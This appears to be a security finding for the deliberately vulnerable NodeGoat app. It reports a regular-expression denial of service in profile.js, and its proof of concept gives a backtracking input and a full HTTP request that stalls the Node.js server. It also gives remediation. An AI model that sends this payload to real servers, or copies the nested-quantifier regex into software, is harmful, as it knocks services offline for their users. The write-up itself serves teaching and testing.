# NG-005 — ReDoS via Catastrophic Backtracking in profile.js

**App**: NodeGoat
**CWE**: CWE-1333 (Inefficient Regular Expression Complexity)
**Severity**: Medium
**File**: `app/routes/profile.js`
**Lines**: 59–61

## Vulnerability

The `handleProfileUpdate` handler validates a bank routing number using a regex with nested quantifiers:

```javascript
// app/routes/profile.js, line 59
const regexPattern = /([0-9]+)+\#/;
const testComplyWithRequirements = regexPattern.test(bankRouting);
```

The pattern `([0-9]+)+` contains nested quantifiers (`+` inside `+`), which causes exponential backtracking on certain inputs. This is a classic ReDoS (Regular Expression Denial of Service) pattern.

## Proof of Concept

The following input causes catastrophic backtracking. The regex engine must explore an exponential number of paths before concluding no match:

```
bankRouting = "111111111111111111111111111111X"
```

Testing locally:

```javascript
const regexPattern = /([0-9]+)+\#/;
console.time("redos");
regexPattern.test("111111111111111111111111111111X");
console.timeEnd("redos");
// Expected: several seconds to minutes depending on string length
```

**HTTP request**:

```http
POST /profile HTTP/1.1
Host: localhost:4000
Cookie: connect.sid=<valid-session>
Content-Type: application/x-www-form-urlencoded

firstName=Alice&lastName=Smith&ssn=000-00-0000&dob=2000-01-01&address=123+Main+St&bankAcc=12345&bankRouting=111111111111111111111111111111X
```

Each request with this input will block the Node.js event loop for seconds, making the server unresponsive.

## Impact

- Denial of Service: event loop starvation in the single-threaded Node.js process
- All other users are blocked from accessing the application during the attack

## Remediation

Remove the nested quantifier:

```javascript
// Safe: no nested quantifiers
const regexPattern = /([0-9]+)\#/;
```

Or use a possessive quantifier / atomic group if the regex engine supports it, or simply use `Number.isInteger(parseInt(bankRouting))`.
